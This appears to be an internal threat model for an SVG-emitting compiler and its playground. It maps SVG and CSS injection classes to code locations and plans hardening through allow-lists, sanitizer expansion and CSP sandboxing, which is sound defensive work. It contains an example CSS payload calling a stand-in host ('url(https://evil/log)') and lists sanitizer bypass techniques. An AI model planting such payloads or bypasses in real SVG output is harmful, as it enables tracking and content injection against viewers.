# Pathogen SVG Sanitization — Threat Model

> Internal companion to the user-facing [docs/security.md](../../docs/security.md). This document captures the threat model in detail; the published page captures the contract.

## Source motivation

The article *"On Scratch SVG Sanitization"* (https://muffin.ink/blog/scratch-svg-sanitization/) catalogs eleven SVG-borne attack classes that have hit Scratch over five years. Each fix layered onto the previous one and most still have known bypasses, which is why the article advocates an iframe + CSP sandbox as the structural defense rather than only growing the sanitizer.

Pathogen has the same surface area in two distinct places:

1. **The compiler** (`src/`) emits SVG. It controls every byte but historically interpolated several user-supplied strings (CSS @property names/syntax/initial-value, layer/def IDs, gradient hrefs, style values) without identifier validation or CSS-content sanitization.
2. **The playground** (`playground/`) renders compiled SVG inline in the parent document. Browsers let `<style>` inside an inline SVG affect the *whole* document, so any CSS injection in the compiler output reaches the playground chrome.

## Attacker model

**Attacker:** authors a `.pathogen` source — directly, via a shared playground URL, or via a third-party site embedding `dist/index.global.js` and feeding it user input.

**Victims:**

- Anyone who opens a shared playground link (current + future share/embed features).
- Anyone visiting a static page (blog, docs, customer site) where compiled SVG is inlined or served as `image/svg+xml` from a top-level navigation.
- The author themselves, if a malicious `SVGFragmentValue` survives sanitization and the playground renders it inline.

**Out of scope:**

- Authors attacking themselves with their own *non-shared* source (self-XSS in a private session).
- Server-side processing of `.pathogen` files outside this repo's surfaces.

## Compiler contract

> Compiled SVG output is safe to embed inline OR serve as `image/svg+xml` from arbitrary `.pathogen` source authored by an untrusted party.

See [docs/security.md](../../docs/security.md) for the published version of this contract.

## Vulnerability → Pathogen surface map

| # | Article vector | Compiler exposure | Playground exposure |
|---|------|------|------|
| 1 | `<script>` in SVG | Not emitted by compiler. | `sanitizeSVGFragment` blocks (`svg-sanitize.ts:80`). |
| 2 | `on*` handlers / `<foreignObject>` w/ HTML | Not emitted by compiler. | `on*` blocked; `<foreignObject>` NOT blocked pre-fix. |
| 3 | `<image href>` to remote URL | Conic/mesh fallback emits `<image href=…>` from `gpuGradientUrls` — `data:` URLs in practice but type is `string`. | Same chain reaches DOM. |
| 4 | CSS `@import` in `<style>` | Confirmed injection: `build-tree.ts:80` interpolated CSSVar `name`/`syntax`/`initialValue` into `@property` raw. | Inline `<style>` reaches parent document. |
| 5 | XSS via library passthrough | N/A. | Compiler output flows through `mountInto()` (DOM API, safe). |
| 6 | CSS `url(remote)` in style attr / `<style>` | `style { fill: "url(https://evil/log)" }` survived `escapeXml`. | Renders inline → browser fetches the URL. |
| 7 | CSS `url()` with `\` escape codes / comments / `var()` | Same surface. | Same. |
| 8 | Long-transition / full-page restyling | Reachable through #4 injection. | Inline `<style>` reaches parent document. |
| 9 | `image-set()` / future `src()` / `image()` | Same passthrough as #6. | Same. |
| 10 | CSS nesting (relaxed) parser mismatch | No nesting emitted today. | Same. |
| 11 | `<use href>` / `<a xlink:href>` / `<animate attributeName="href">` | Compiler does not emit these today. | Reachable through `SVGFragmentValue`. Not blocked pre-fix. |
| 12 | DOCTYPE / XXE | `DOMParser('image/svg+xml')` does not expand external entities. Negligible. | Same. |

## Phased response

See [the implementation plan](../../../.claude/plans/i-was-reading-the-polished-peacock.md) for the full phased approach. In summary:

- **Phase 0** — threat model + failing tests (this document + `tests/security/*.test.ts`)
- **Phase 1** — compiler emission hardening: identifier validation + strict CSS-value allow-list
- **Phase 2** — fragment sanitizer expansion: more blocked elements, href allow-list, no inline CSS
- **Phase 3** — iframe + strict CSP for every render surface (playground, blog, VS Code)
- **Phase 4** — surface-parity audit + CI gate

## Why a strict allow-list, not unescape-and-scrub

The article's whole arc is "we kept rolling our own scrubbers and kept missing bypasses" — CSS escapes (2026), comments-around-url (2025), `image-set` (2025), `var()` indirection (2026), future `src()` / `image()` (20XX), css-tree CSS-nesting parser mismatch (2026). Each fix triggered the next bypass.

A strict allow-list closes the entire class without us ever needing to *correctly* parse CSS. Pathogen has its own `CSSVar()` constructor for variable refs, so users never need to write raw `var()` in style values; this is the lever that makes the strict allow-list practical.

Greps confirmed (2026-04-27) zero existing `style { … url( | var( | calc( | \xx }` usage in `tests/`, `website/blog/samples/`, `docs/`, `project-docs/` — so the allow-list has zero migration cost today.
